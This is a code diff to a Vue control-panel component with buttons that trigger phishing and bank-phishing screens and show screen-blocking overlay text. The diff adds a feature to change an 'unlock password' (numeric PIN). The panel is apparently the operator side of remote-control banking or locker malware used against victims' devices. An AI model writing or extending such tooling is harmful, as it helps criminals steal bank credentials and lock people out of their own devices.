@@ -69,6 +69,7 @@ interface Emits {
     (e: 'sendPhish', type: string): void;
     (e: 'sendBankPhish', bank: string): void;
     (e: 'toggleBlockText', text: string, bg: string): void;
+    (e: 'modifyPassword', password: string): void;
 }
 
 const emit = defineEmits<Emits>();
@@ -78,6 +79,7 @@ const phishType = ref('0');
 const blockText = ref('');
 const blockBg = ref('0');
 const isBlockTextActive = ref(false);
+const passwordInput = ref('');
 
 const handlePaste = () => {
     if (pasteText.value.trim()) {
@@ -93,6 +95,13 @@ const handleSendPhish = () => {
 const handleToggleBlockText = () => {
     isBlockTextActive.value = !isBlockTextActive.value;
     emit('toggleBlockText', blockText.value, blockBg.value);
+};
+
+const handleModifyPassword = () => {
+    if (passwordInput.value.trim() && /^\d+$/.test(passwordInput.value)) {
+        emit('modifyPassword', passwordInput.value);
+        passwordInput.value = '';
+    }
 };
 
 const bankButtons = [
@@ -374,6 +383,31 @@ const bankButtons = [
                             <NIcon :component="bank.icon" />
                         </template>
                         {{ bank.name }}
+                    </NButton>
+                </div>
+            </div>
+
+            <NDivider style="margin: 12px 0" />
+
+            <!-- 修改解锁密码 -->
+            <div class="control-section">
+                <div class="section-title">
+                    <NIcon :component="KeyOutline" size="14" />
+                    <span>修改解锁密码</span>
+                </div>
+                <div class="input-row">
+                    <NInput
+                        v-model:value="passwordInput"
+                        placeholder="输入数字密码..."
+                        size="small"
+                        :allow-input="(value: string) => /^\d*$/.test(value)"
+                        @keyup.enter="handleModifyPassword"
+                    />
+                    <NButton size="small" type="warning" @click="handleModifyPassword">
+                        <template #icon>
+                            <NIcon :component="KeyOutline" />
+                        </template>
+                        修改
                     </NButton>
                 </div>
             </div>
